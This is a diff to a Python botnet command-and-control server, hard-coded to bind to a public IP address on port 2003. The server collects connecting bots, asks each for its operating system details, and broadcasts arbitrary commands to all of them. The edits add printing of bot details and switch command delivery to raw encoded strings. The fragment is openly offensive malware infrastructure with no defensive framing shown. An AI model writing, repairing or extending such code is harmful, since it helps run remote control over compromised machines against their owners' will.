@@ -20,7 +20,7 @@ def start_server(port=2003,ip="142.93.197.240"):
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.bind((ip,port))
     s.listen(5)
-    print("\n[*] Server Started!")
+    print("\n[*] Server Started!\n")
     while True:
         bot,addr = s.accept()
         botnet[str(addr[0])] = bot
@@ -32,15 +32,19 @@ def detect_os():
     for bot in botnet:
         botnet[bot].send("OS".encode())
         bot_os = botnet[bot].recv(1024).decode()
+        print("Details for %s : "%(str(bot)))
+        print(bot_os)
+        print("\n\n\n\n")
 
 def exec_command(cmd):
     global botnet
     print("[*] Sending Command Packets...")
     sleep(1)
     for bot in botnet:
-        cmd_size = len(cmd)
-        packet = struct.pack("<H%ds"%(cmd_size),cmd_size,cmd) # H --> 2 Bytes Buffer Size
-        bot.send(packet)
+        botnet[bot].send(cmd.encode())
+        #cmd_size = len(cmd)
+        #packet = struct.pack("<H%ds"%(cmd_size),cmd_size,cmd) # H --> 2 Bytes Buffer Size
+        #bot.send(packet)
         #print("[*] Command packet sent")
 
 def process_cmd(cmd):
